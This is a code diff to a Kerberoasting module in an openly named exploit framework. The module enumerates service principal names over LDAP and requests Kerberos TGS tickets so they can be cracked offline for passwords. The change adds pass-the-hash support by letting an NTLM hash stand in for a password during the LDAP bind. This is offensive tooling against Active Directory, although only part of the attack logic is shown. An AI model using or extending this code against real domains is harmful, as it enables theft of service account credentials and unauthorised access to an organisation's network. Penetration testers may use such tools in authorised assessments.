@@ -6,12 +6,12 @@ import (
 	"fmt"
 	"strings"
 
-	ldaplib "github.com/go-ldap/ldap/v3"
-	"github.com/jcmturner/gokrb5/v8/client"
-	"github.com/jcmturner/gokrb5/v8/config"
+	"github.com/KKingZero/erebus-exploit-framwork/pkg/ldapcli"
 	pb "github.com/KKingZero/erebus-exploit-framwork/pkg/pb"
 	"github.com/KKingZero/erebus-exploit-framwork/pkg/plugin"
 	"github.com/KKingZero/erebus-exploit-framwork/pkg/suggestions"
+	"github.com/jcmturner/gokrb5/v8/client"
+	"github.com/jcmturner/gokrb5/v8/config"
 	"google.golang.org/protobuf/proto"
 )
 
@@ -21,8 +21,10 @@ func init() {
 
 type KerberoastModule struct{}
 
-func (m *KerberoastModule) Name() string        { return "kerberoast" }
-func (m *KerberoastModule) Description() string { return "Kerberoasting - extract TGS tickets for offline cracking" }
+func (m *KerberoastModule) Name() string { return "kerberoast" }
+func (m *KerberoastModule) Description() string {
+	return "Kerberoasting - extract TGS tickets for offline cracking"
+}
 
 func (m *KerberoastModule) Execute(ctx context.Context, cfgData []byte) ([]byte, error) {
 	cfg := &pb.KerberoastConfig{}
@@ -42,8 +44,11 @@ func runKerberoast(_ context.Context, cfg *pb.KerberoastConfig) (*pb.KerberoastR
 	if cfg.Domain == "" {
 		return nil, fmt.Errorf("domain required")
 	}
-	if cfg.Username == "" || cfg.Password == "" {
-		return nil, fmt.Errorf("username and password required")
+	if cfg.Username == "" {
+		return nil, fmt.Errorf("username required")
+	}
+	if cfg.Password == "" && cfg.NtlmHash == "" {
+		return nil, fmt.Errorf("password or ntlm_hash required")
 	}
 
 	dc := cfg.TargetDc
@@ -56,20 +61,17 @@ func runKerberoast(_ context.Context, cfg *pb.KerberoastConfig) (*pb.KerberoastR
 	var samMap = make(map[string]string) // SPN -> sAMAccountName
 
 	if len(spns) == 0 {
-		ldapAddr := dc
-		if !strings.Contains(ldapAddr, ":") {
-			ldapAddr = ldapAddr + ":389"
-		}
-		conn, err := ldaplib.Dial("tcp", ldapAddr)
+		opts := ldapcli.DefaultOptions()
+		opts.Host = dc
+		opts.Domain = cfg.Domain
+		opts.Username = cfg.Username
+		opts.Password = cfg.Password
+		opts.Hash = cfg.NtlmHash
+		conn, err := ldapcli.Bind(opts)
 		if err != nil {
-			return nil, fmt.Errorf("LDAP connect for SPN enum: %w", err)
-		}
-		defer conn.Close()
-
-		bindDN := fmt.Sprintf("%s@%s", cfg.Username, cfg.Domain)
-		if err := conn.Bind(bindDN, cfg.Password); err != nil {
 			return nil, fmt.Errorf("LDAP bind for SPN enum: %w", err)
 		}
+		defer conn.Close()
 
 		baseDN := domainToBaseDN(cfg.Domain)
 		accounts, err := EnumKerberoastable(conn, baseDN)
@@ -85,6 +87,9 @@ func runKerberoast(_ context.Context, cfg *pb.KerberoastConfig) (*pb.KerberoastR
 
 	if len(spns) == 0 {
 		return &pb.KerberoastResult{}, nil
+	}
+	if cfg.Password == "" {
+		return nil, fmt.Errorf("password required to request TGS (ntlm_hash is LDAP-enum only)")
 	}
 
 	// Build Kerberos config
